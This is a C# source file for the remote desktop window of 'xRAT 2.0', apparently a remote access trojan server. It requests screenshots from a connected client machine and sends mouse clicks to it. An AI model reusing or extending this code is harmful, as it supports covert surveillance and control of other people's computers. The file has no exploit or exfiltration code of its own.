using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Packets.ServerPackets;
using xServer.Properties;

namespace xServer.Forms
{
    public partial class FrmRemoteDesktop : Form
    {
        private readonly Client _connectClient;
        private bool _enableMouseInput;
        private bool _keepRunning;

        public FrmRemoteDesktop(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRdp = this;
            _keepRunning = false;
            _enableMouseInput = false;
            InitializeComponent();
        }

        private void FrmRemoteDesktop_Load(object sender, EventArgs e)
        {
            Text = string.Format("xRAT 2.0 - Remote Desktop [{0}:{1}]", _connectClient.EndPoint.Address,
                _connectClient.EndPoint.Port);

            panelTop.Left = (Width/2) - (panelTop.Width/2);

            btnHide.Left = (panelTop.Width/2) - (btnHide.Width/2);

            btnShow.Location = new Point(377, 0);
            btnShow.Left = (Width/2) - (btnShow.Width/2);

            if (_connectClient.Value != null)
                new Monitors().Execute(_connectClient);
        }

        private void GetDesktop()
        {
            _keepRunning = true;

            while (_keepRunning)
            {
                try
                {
                    Invoke((MethodInvoker) delegate
                    {
                        btnStart.Enabled = false;
                        btnStop.Enabled = true;
                        barQuality.Enabled = false;
                    });

                    if (_connectClient.Value != null)
                    {
                        if (_connectClient.Value.LastDesktopSeen)
                        {
                            var quality = 1;
                            var selectedMonitorIndex = 0;
                            Invoke((MethodInvoker) delegate
                            {
                                quality = barQuality.Value;
                                selectedMonitorIndex = cbMonitors.SelectedIndex;
                            });

                            new Desktop(quality, selectedMonitorIndex).Execute(_connectClient);
                            _connectClient.Value.LastDesktopSeen = false;
                        }
                    }
                    Thread.Sleep(100);
                }
                catch
                {
                }
            }

            try
            {
                Invoke((MethodInvoker) delegate
                {
                    btnStart.Enabled = true;
                    btnStop.Enabled = false;
                    barQuality.Enabled = true;
                });
            }
            catch
            {
            }

            _keepRunning = false;
        }

        private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            _keepRunning = false;
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRdp = null;
        }

        private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
        {
            panelTop.Left = (Width/2) - (panelTop.Width/2);
            btnShow.Left = (Width/2) - (btnShow.Width/2);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (!_keepRunning)
                new Thread(GetDesktop).Start();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            _keepRunning = false;
        }

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            var value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            if (_enableMouseInput)
            {
                picDesktop.Cursor = Cursors.Default;
                btnMouse.Image = Resources.mouse_delete;
                _enableMouseInput = false;
            }
            else
            {
                picDesktop.Cursor = Cursors.Hand;
                btnMouse.Image = Resources.mouse_add;
                _enableMouseInput = true;
            }
        }

        private void picDesktop_MouseClick(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput)
            {
                var local_x = e.X;
                var local_y = e.Y;

                var remote_x = local_x*picDesktop.Image.Width/picDesktop.Width;
                var remote_y = local_y*picDesktop.Image.Height/picDesktop.Height;

                var left = true;
                if (e.Button == MouseButtons.Right)
                    left = false;

                if (_connectClient != null)
                    new MouseClick(left, false, remote_x, remote_y).Execute(_connectClient);
            }
        }

        private void picDesktop_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput)
            {
                var local_x = e.X;
                var local_y = e.Y;

                var remote_x = local_x*picDesktop.Image.Width/picDesktop.Width;
                var remote_y = local_y*picDesktop.Image.Height/picDesktop.Height;

                var left = true;
                if (e.Button == MouseButtons.Right)
                    left = false;

                if (_connectClient != null)
                    new MouseClick(left, true, remote_x, remote_y).Execute(_connectClient);
            }
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            panelTop.Visible = false;
            btnShow.Visible = true;
            btnHide.Visible = false;
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            panelTop.Visible = true;
            btnShow.Visible = false;
            btnHide.Visible = true;
        }
    }
}